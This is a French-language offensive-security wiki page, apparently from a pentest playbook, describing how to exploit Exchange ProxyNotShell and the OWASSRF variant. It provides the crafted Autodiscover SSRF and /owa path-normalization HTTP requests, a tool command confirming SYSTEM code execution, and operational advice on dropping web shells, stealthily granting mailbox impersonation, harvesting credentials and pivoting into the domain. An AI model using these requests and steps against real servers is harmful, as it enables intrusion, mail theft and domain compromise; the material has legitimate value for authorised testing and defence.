---
order: 3
title: "ProxyNotShell : SSRF Autodiscover authentifiée vers PowerShell"
description: "La chaîne Exchange qui ne requiert qu'un seul identifiant de boîte aux lettres valide : une SSRF Autodiscover authentifiée atteint le back end PowerShell distant pour l'exécution de code, la variante OWASSRF pivotant vers le chemin /owa/.../ecp après la mitigation par réécriture d'URL et un contournement ultérieur de ApprovedApplicationCollection pour atteindre de nouveau PowerShell."
keywords:
  - ProxyNotShell
  - OWASSRF
  - SSRF authentifiée
  - Autodiscover
  - back end PowerShell
---

# ProxyNotShell

ProxyNotShell est le successeur de ProxyShell qui ne requiert qu'un seul identifiant. Là où ProxyShell s'introduisait en pre-auth, ProxyNotShell requiert **un identifiant de boîte aux lettres valide** (issu du [spraying](../password-spraying.md)) et l'utilise pour conduire une **SSRF Autodiscover authentifiée** qui atteint le back end **PowerShell** distant, lequel exécute alors du code sous l'identité Exchange. La première mitigation livrée par Microsoft fut une règle de réécriture d'URL qui bloquait le motif de la SSRF Autodiscover ; la variante **OWASSRF** contournait cette règle en atteignant le back end via le chemin `/owa/.../ecp` à la place, et un contournement ultérieur atteignait de nouveau PowerShell en abusant du traitement de `ApprovedApplicationCollection`. L'identifiant est la seule barrière qui n'a jamais disparu.

## Prérequis

- Un identifiant de boîte aux lettres valide, avec une boîte aux lettres et l'accès à PowerShell distant activé pour cet utilisateur.
- La build est antérieure au rollup de sécurité de fin 2022 pour le chemin ProxyNotShell complet, ou une build où la mitigation par réécriture d'URL a été appliquée mais pas le correctif de la SSRF (la fenêtre OWASSRF), confirmée par l'[empreinte de version](../enumeration.md).
- `/autodiscover` (ProxyNotShell) ou `/owa` et le back end ECP (OWASSRF) accessibles.

## Étape 1 : s'authentifier, puis SSRF vers PowerShell

Contrairement à ProxyShell, vous fournissez de vrais identifiants. Le front end authentifié relaie une requête Autodiscover dont le chemin embarqué dirige vers le endpoint PowerShell du back end :

```http
POST /autodiscover/autodiscover.json?@foo.com/powershell/?&Email=autodiscover/autodiscover.json%3F@foo.com HTTP/1.1
Host: mail.example.com
Authorization: Basic <base64 EXAMPLE\john.doe:Password1>
Content-Type: text/xml

<request body selecting the PowerShell endpoint and the WSMan action>
```

Un `200` porteur d'une réponse WSMan/SOAP (plutôt qu'un `401` ou une redirection de connexion) signifie que la SSRF authentifiée a atteint le back end PowerShell et que vous disposez d'un runspace. Un `401` signifie que l'identifiant est incorrect ou n'a pas l'accès à PowerShell distant ; une redirection signifie que le motif Autodiscover est bloqué, donc essayez le chemin OWASSRF ci-dessous.

## Étape 2 (variante OWASSRF) : atteindre le back end via /owa/.../ecp

Lorsque la mitigation par réécriture d'URL Autodiscover est présente mais que le serveur n'est par ailleurs pas corrigé, le même PowerShell du back end est accessible en routant à travers le front end OWA jusqu'au back end ECP, que la règle de réécriture ne couvrait pas :

```http
POST /owa/mastermailbox%2f..%2fecp/... HTTP/1.1
Host: mail.example.com
Authorization: Basic <base64 EXAMPLE\john.doe:Password1>
Cookie: <authenticated OWA session cookies>
```

Le segment `mastermailbox/..` est la normalisation de chemin qui fait atterrir la requête sur le back end ECP/PowerShell malgré la réécriture Autodiscover. Un `200` avec une réponse de runspace PowerShell confirme qu'OWASSRF fonctionne sur cette build.

## Étape 3 : exécuter du code dans le runspace

Avec l'un ou l'autre chemin ouvert, vous détenez un runspace PowerShell distant s'exécutant sous l'identité Exchange. À partir de là, les primitives d'écriture sont les mêmes que pour ProxyShell : déposer un shell via un export de boîte aux lettres, ou (plus discrètement) octroyer l'impersonation. Un seul outil chaîne l'authentification, la SSRF et la commande :

```bash
# Supply the sprayed credential; the tool opens the runspace and runs the command
python3 proxynotshell.py -u 'EXAMPLE\john.doe' -p 'Password1' \
  -t https://mail.example.com -c 'whoami'
# -> nt authority\system  (confirms code execution)
```

Si l'outil s'authentifie mais indique « runspace denied », la boîte aux lettres n'a pas l'accès à PowerShell distant ; choisissez un autre identifiant obtenu par spraying dont l'utilisateur est activé pour PowerShell.

## Suite

Le runspace est `SYSTEM`/pool d'applications Exchange sur le serveur. Déposez un web shell pour la persistance ou octroyez `ApplicationImpersonation` pour un [accès aux boîtes aux lettres](../mailbox-access.md) furtif, puis récupérez les identifiants et pivotez vers le domaine grâce aux droits AD d'Exchange, comme dans la [vue d'ensemble des chaînes RCE](index.md).

## Notes d'exploitation

- L'exigence d'un identifiant est la contrainte déterminante : associez ProxyNotShell à un succès de [spraying](../password-spraying.md), et assurez-vous que cet utilisateur a une boîte aux lettres et PowerShell distant activé, car tous les comptes de domaine valides ne l'ont pas.
- Essayez d'abord le chemin Autodiscover de ProxyNotShell ; s'il redirige, la mitigation par réécriture d'URL est en place et c'est le chemin `/owa/.../ecp` d'OWASSRF qu'il faut utiliser.
- La sortie plus discrète consiste à utiliser le runspace pour octroyer l'impersonation et lire le courrier via EWS, en évitant l'objet de requête d'export et le fichier de shell qu'un web shell laisse derrière lui.

## Outils

- **PoC ProxyNotShell / OWASSRF** : pilotes de SSRF authentifiée pour les deux variantes de chemin.
- **Metasploit** (modules PowerShell authentifiés Exchange) : options maintenues de bout en bout.
- **Cmdlets PowerShell distantes Exchange** : les primitives d'écriture et d'octroi de rôle du back end une fois le runspace ouvert.

## Références

- [CrowdStrike: OWASSRF, exploiting Exchange after the ProxyNotShell mitigation](https://www.crowdstrike.com/en-us/blog/owassrf-exploit-analysis-and-recommendations/)
- [Zero Day Initiative: exploiting Exchange PowerShell after ProxyNotShell (ApprovedApplicationCollection)](https://www.thezdi.com/blog/2024/9/11/exploiting-exchange-powershell-after-proxynotshell-part-2-approvedapplicationcollection)
- [Microsoft Security: stopping attacks against on-premises Exchange Server with AMSI](https://www.microsoft.com/en-us/security/blog/2025/04/09/stopping-attacks-against-on-premises-exchange-server-and-sharepoint-server-with-amsi/)
